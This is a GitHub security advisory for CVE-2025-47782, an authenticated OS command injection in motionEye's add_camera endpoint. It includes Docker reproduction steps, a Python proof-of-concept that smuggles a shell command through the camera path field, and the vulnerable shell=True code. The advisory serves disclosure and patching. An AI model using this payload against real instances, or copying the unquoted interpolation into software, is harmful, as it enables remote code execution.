# [H] motionEye vulnerable to RCE in add_camera Function Due to unsafe command execution

## Summary
Severity: High
Advisory: GHSA-g5mq-prx7-c588
CVE: CVE-2025-47782
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-05-15
Source: https://github.com/advisories/GHSA-g5mq-prx7-c588
Type: github-advisory

## Affected
- PyPI: `motioneye` — affected >=0.43.1b1 <0.43.1b4

## Details
### Summary
Using a constructed (camera) device path with the `config/add`/`add_camera` motionEye web API allows an attacker with motionEye admin user credentials to execute any UNIX shell code within a non-interactive shell as executing user of the motionEye instance, `motion` by default.

#### function call stack
1. `post`
2. `add_camera`
3. `config.add_camera`
4. `v4l2ctl.list_resolutions`
5. `utils.call_subprocess`
6. `subprocess.run`

### PoC
#### build
```sh
RUN_USER="user"
RUN_UID=$(id -u ${RUN_USER})
RUN_GID=$(id -g ${RUN_USER})
TIMESTAMP="$(date '+%Y%m%d-%H%M')"

docker build \
  --network host \
  --build-arg="RUN_UID=${RUN_UID?}" \
  --build-arg="RUN_GID=${RUN_GID?}" \
  -t "${USER?}/motioneye:${TIMESTAMP}" \
  --no-cache \
  -f docker/Dockerfile .
```

#### reproduce
Run:
```sh
docker run --rm  -d   -p 8765:8765   --hostname="motioneye"   -v /etc/localtime:/etc/localtime:ro   -v /tmp/motioneyeconfig:/etc/motioneye   -v /tmp/motioneyeconfig:/var/lib/motioneye
```
```console
bash-4.2$ docker logs ceb435eacf55 -f
configure_logging cmd motioneye: False
configure logging to file: None
    INFO: hello! this is motionEye server 0.43.1b3
   DEBUG: found motion executable "/usr/bin/motion" version "4.7.0"
   DEBUG: found ffmpeg executable "/usr/bin/ffmpeg" version "7.1.1-1+b1"
   DEBUG: listing config dir /etc/motioneye...
   DEBUG: found camera with id 1
   DEBUG: reading camera config from /etc/motioneye/camera-1.conf...
   DEBUG: loading additional config structure for camera, without separators
   DEBUG: Using selector: EpollSelector
   DEBUG: searching motion executable
   DEBUG: starting motion executable "/usr/bin/motion" version "4.7.0"
    INFO: cleanup started
    INFO: wsswitch started
    INFO: tasks started
    INFO: mjpg customer garbage collector has started
    INFO: server started
```
Now, run the following script to attack motionEye:
```python
import requests
import json

url = "http://your_ip:8765/config/add?_username=admin&_signature=c22baef3399cb7328e22ded1ca68395b4daecd18"

payload = json.dumps({
  "proto": "v4l2",
  "path": "' `touch /tmp/bbbb` '"
})
headers = {
  'Content-Type': 'application/json'
}

response = requests.request("POST", url, headers=headers, data=payload)

print(response.text)
```

<img width="1187" alt="Image" src="https://github.com/user-attachments/assets/8e0a9bfe-8de3-4023-96d6-0e888bfe3c62" />

<img width="324" alt="Image" src="https://github.com/user-attachments/assets/04c73349-694a-4531-993e-eea765b87d0e" />

#### Discussion
It is obvious that call_subprocess was used to execute the incoming data, resulting in a vulnerability
```python
def list_resolutions(device):
    from motioneye import motionctl

    device = utils.make_str(device)

    if device in _resolutions_cache:
        return _resolutions_cache[device]

    logging.debug(f'listing resolutions of device {device}...')

    resolutions = set()
    output = b''
    started = time.time()
    cmd = f"v4l2-ctl -d '{device}' --list-formats-ext | grep -vi stepwise | grep -oE '[0-9]+x[0-9]+' || true"
    logging.debug(f'running command "{cmd}"')

    try:
        output = utils.call_subprocess(cmd, shell=True, stderr=utils.DEV_NULL)
    except:
        logging.error(f'failed to list resolutions of device "{device}"')

    output = utils.make_str(output)

def call_subprocess(
    args,
    stdin=None,
    input=None,
    stdout=subprocess.PIPE,
    stderr=DEV_NULL,
    capture_output=False,
    shell=False,
    cwd=None,
    timeout=None,
    check=True,
    encoding='utf-8',
    errors=None,
    text=None,
    env=None,
) -> str:
    """subprocess.run wrapper to return output as a decoded string"""
    return subprocess.run(
        args,
        stdin=stdin,
        input=input,
        stdout=stdout,
        stderr=stderr,
        capture_output=capture_output,
        shell=shell,
        cwd=cwd,
        timeout=timeout,
        check=check,
        encoding=encoding,
        errors=errors,
        text=text,
        env=env,
    ).stdout.strip()
```

### Impact
RCE

### Patches
The vulnerability has been patch with motionEye v0.43.1b4: https://github.com/motioneye-project/motioneye/pull/3143

### Workarounds
Applying the following patch, replacing the literal single quotes in the created `cmd` string with a `shlex.quote`d input device: https://patch-diff.githubusercontent.com/raw/motioneye-project/motioneye/pull/3143.patch

### References
https://github.com/motioneye-project/motioneye/issues/3142

### Credit
The vulnerability was discovered by Tencent YunDing Security Lab.

## References
- https://github.com/motioneye-project/motioneye/security/advisories/GHSA-g5mq-prx7-c588
- https://nvd.nist.gov/vuln/detail/CVE-2025-47782
- https://github.com/motioneye-project/motioneye/issues/3142
- https://github.com/motioneye-project/motioneye/pull/3143
- https://github.com/motioneye-project/motioneye
- https://github.com/pypa/advisory-database/tree/main/vulns/motioneye/PYSEC-2025-39.yaml
